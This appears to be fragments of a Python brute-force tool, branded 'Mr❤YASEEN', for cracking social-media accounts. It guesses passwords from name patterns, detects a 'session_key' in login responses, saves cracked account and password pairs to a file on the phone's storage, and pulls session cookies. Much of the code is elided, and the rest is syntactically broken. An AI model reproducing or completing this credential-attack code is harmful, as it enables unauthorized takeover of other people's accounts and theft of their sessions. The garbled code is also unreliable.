...
def pak():
	...
	try:
		...
		limit = 1000,5000,100000
	for nmbr in range(limit): 92345,92318,92334
...
def method():
    ...
    if 'o':      
        ...
        if lp.isnumeric():
            ex = 'firstlast First Last  first123 first1234 first@123 '
            print(f'{oo("+")}{ex} (ETC)')
    ...
    print(f"{oo('•')}/sdcard/Mr❤YASEEN-OK.txt")
    print('\033[1;93m='*25)
    print()
    def start(user):
     try:
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mMr❤YASEEN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Mr❤YASEEN-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                print('\r\033[1;95m[\033[1;97mMr❤YASEEN-2F\033[1;95m] \033[1;95m'+acc+' \033[1;95m•\033[1;95m '+pword+'   ')
                break
            else:
                continue
        loop += 1
...
def andom():
    ...
    if 'o': 
        ...
        if tpp.isnumeric():
            ex = 'firstlast first123 last123 first1234 first last'
            print(f'{oo("+")}{ex} (ETC)')
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mmR❤YASEEN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/mR❤YASEENYaseen-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
